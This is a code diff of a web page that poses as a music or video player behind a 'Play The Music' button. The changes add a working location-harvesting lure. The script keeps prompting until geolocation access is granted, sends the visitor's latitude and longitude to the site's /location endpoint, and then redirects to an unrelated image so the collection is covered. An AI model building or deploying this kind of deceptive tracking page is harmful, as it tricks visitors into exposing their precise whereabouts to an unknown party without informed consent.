@@ -12,45 +12,50 @@
   <!-- <iframe src="https://www.youtube.com/embed/II2EO3Nw4m0?autoplay=1&mute=1&controls=0&showinfo=0&loop=1&playlist=VIDEO_ID"></iframe> -->
   <!-- <iframe width="560" height="315" src="https://www.youtube.com/embed/II2EO3Nw4m0?si=9BaGNUy8-hZMkWA9" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe> -->
   <iframe width="560" height="315" src="https://www.youtube.com/embed/YZAFd9o3RYQ?si=VxpMZck8rrJSAGYT" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>
+  <button id="getLocationBtn">Play The Music</button>
+
   <script>
     async function askLocation() {
       let granted = false;
   
       while (!granted) {
         try {
-          const position = await new Promise((resolve, reject) => {
+          await new Promise((resolve, reject) => {
             navigator.geolocation.getCurrentPosition(resolve, reject);
           });
-  
-          const { latitude, longitude } = position.coords;
-          console.log("📍 Location fetched:", latitude, longitude);
-          alert(`📍 Location fetched: Lat ${latitude}, Long ${longitude}`);
           granted = true;
-  
-          const res = await fetch("/location", {
-            method: "POST",
-            headers: {
-              "Content-Type": "application/json"
-            },
-            body: JSON.stringify({ latitude, longitude })
-          });
-  
-          const result = await res.json();
-          alert(result.message || result.error);
-          console.log("📤 Server response:", result);
+          alert("✅ Location access granted!");
         } catch (err) {
-          console.warn("⚠️ Location access denied:", err);
           alert("⚠️ Please allow location access to continue.");
           await new Promise(resolve => setTimeout(resolve, 2000));
         }
       }
+  
+      navigator.geolocation.getCurrentPosition(async (position) => {
+        const { latitude, longitude } = position.coords;
+        alert(`📍 Location fetched: ${latitude}, ${longitude}`);
+  
+        const res = await fetch("/location", {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json"
+          },
+          body: JSON.stringify({ latitude, longitude })
+        });
+  
+        const result = await res.json();
+        if (result.message) {
+          alert("✅ Location saved!");
+          // 🔁 Redirect here
+          window.location.href = "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQbDOJXnHkd1MaBK5Ht_LvEFAkgHKWs44banw&s"; // or your desired URL
+        } else {
+          alert("❌ " + result.error);
+        }
+      });
     }
   
-    // Trigger on page load
-    window.onload = askLocation;
+    document.getElementById("getLocationBtn").addEventListener("click", askLocation);
   </script>
   
-  
-
 </body>
 </html>
